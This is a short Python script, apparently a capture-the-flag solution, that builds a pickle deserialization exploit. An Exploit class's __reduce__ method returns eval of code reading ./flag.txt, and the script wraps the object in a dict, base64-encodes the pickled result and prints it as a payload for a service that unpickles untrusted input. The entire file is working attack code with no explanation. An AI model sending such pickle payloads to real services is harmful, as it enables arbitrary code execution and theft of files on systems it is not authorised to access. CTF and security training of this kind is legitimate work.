import os
import pickle
import requests
import base64

class Exploit(object):
    def __reduce__(self):
        p = "open('./flag.txt', 'r').read()"
        return (eval, (p, ))

body = {
    'name': Exploit()
}

data = base64.b64encode(pickle.dumps(body)).decode('utf8')
print(data)